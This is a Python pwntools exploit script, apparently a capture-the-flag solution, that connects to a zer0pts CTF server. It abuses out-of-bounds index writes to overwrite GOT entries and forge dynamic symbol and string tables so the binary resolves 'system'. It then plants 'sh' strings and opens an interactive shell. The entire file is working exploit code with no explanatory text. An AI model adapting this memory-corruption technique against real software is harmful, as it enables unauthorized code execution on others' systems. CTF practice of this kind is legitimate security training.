from pwn import *
import copy

# exe = context.binary = ELF('.//chall')
# libc = ELF(".//libc_test.so.6") if args.REMOTE else exe.libc
size = 0x100000

# p = process(".//chall")
# gdb.attach(p, gdbscript="""
# """)
HOST, PORT = '172.17.0.2', 31338
HOST, PORT = 'pwn.ctf.zer0pts.com', 9004
r = remote(HOST, PORT)

size = 0x20000

main = 0x400737
ret = 0x400821

r.recvuntil("n =")
r.sendline("-1")
r.recvuntil("i =")
r.sendline("1573894")
r.recvuntil(" =")
r.sendline(str(main)) # puts -> main

r.recvuntil("n =")
r.sendline("-2")
r.recvuntil("i =")
r.sendline(str(0x601048//4))
r.recvuntil(" =")
r.sendline(str(ret)) # exit -> ret

fake_dynsym = 0x601080
fake_symtab = 0x601090

r.recvuntil("n =")
r.sendline("-3")
r.recvuntil("i =")
r.sendline(str(fake_dynsym//4))
r.recvuntil(" =")
r.sendline(str(6)) # make fake dynsym

r.recvuntil("n =")
r.sendline("-4")
r.recvuntil("i =")
r.sendline(str((fake_dynsym + 8)//4))
r.recvuntil(" =")
r.sendline(str(fake_symtab)) # make fake dynsym 

size_elf64_sym = 24

r.recvuntil("n =")
r.sendline("-5")
r.recvuntil("i =")
r.sendline(str((fake_symtab+size_elf64_sym*2)//4))
r.recvuntil(" =")
r.sendline(str(0x10)) # make fake symtab 

r.recvuntil("n =")
r.sendline("-6")
r.recvuntil("i =")
r.sendline(str((fake_symtab+4+size_elf64_sym*2)//4))
r.recvuntil(" =")
r.sendline(str(0x12)) # make fake symtab 

fake_dynstr = 0x601100
fake_strtab = 0x601110

r.recvuntil("n =")
r.sendline("-7")
r.recvuntil("i =")
r.sendline(str(fake_dynstr//4))
r.recvuntil(" =")
r.sendline(str(5)) # make fake dynstr

r.recvuntil("n =")
r.sendline("-8")
r.recvuntil("i =")
r.sendline(str((fake_dynstr + 8)//4))
r.recvuntil(" =")
r.sendline(str(fake_strtab)) # make fake dynstr 


r.recvuntil("n =")
r.sendline("-9")
r.recvuntil("i =")
r.sendline(str((fake_strtab + 0x10)//4))
r.recvuntil(" =")
r.sendline(str(0x74737973)) # make fake strtab 

r.recvuntil("n =")
r.sendline("-10")
r.recvuntil("i =")
r.sendline(str((fake_strtab + 0x14)//4))
r.recvuntil(" =")
r.sendline(str(0x6d65)) # make fake sstrtab 


r.recvuntil("n =")
r.sendline(str(size))
r.recvuntil("i =")
r.sendline(str((0x2a61e8+0x8)//4))
r.recvuntil(" =")
r.sendline(str(fake_dynsym)) # overwrite dynsym

r.recvuntil("n =")
r.sendline(str(size))
r.recvuntil("i =")
r.sendline(str((0x3271e8)//4))
r.recvuntil(" =")
r.sendline(str(fake_dynstr)) # overwrite dynstr


setbuf_got = 0x601020
setbuf_plt = 0x4005f0

r.recvuntil("n =")
r.sendline("-23")
r.recvuntil("i =")
r.sendline(str(setbuf_got // 4))
r.recvuntil(" =")
r.sendline(str(setbuf_plt + 6)) # erase setbuf_got

r.recvuntil("n =")
r.sendline("-23")
r.recvuntil("i =")
r.sendline(str((setbuf_got+4) // 4))
r.recvuntil(" =")
r.sendline(str(0)) # erase setbuf_got

# alarm_got = 0x601030

# r.recvuntil("n =")
# r.sendline("-23")
# r.recvuntil("i =")
# r.sendline(str((alarm_got + 4)//4))
# r.recvuntil(" =")
# r.sendline(str(0)) # puts -> setup 

# r.recvuntil("n =")
# r.sendline("-23")
# r.recvuntil("i =")
# r.sendline(str((alarm_got)//4))
# r.recvuntil(" =")
# r.sendline(str(0x400844)) # puts -> setup 

size2 = 0x100000
stdout = 0x7ed760
stdin = 0x6ee970

r.recvuntil("n =")
r.sendline(str(size2))
r.recvuntil("i =")
r.sendline(str((stdin)// 4))
r.recvuntil(" =")
r.sendline(str(0x733b6060)) # sh
# r.interactive()

stdin2 = 0xaef970
r.recvuntil("n =")
r.sendline(str(size2))
r.recvuntil("i =")
r.sendline(str((stdin2 + 4)// 4))
r.recvuntil(" =")
r.sendline(str(0x3b68)) # sh
# r.interactive()


setup = 0x400822

r.recvuntil("n =")
r.sendline("-1")
r.recvuntil("i =")
r.sendline("1573894")
r.recvuntil(" =")
r.sendline(str(setup)) # puts -> setup 


r.interactive()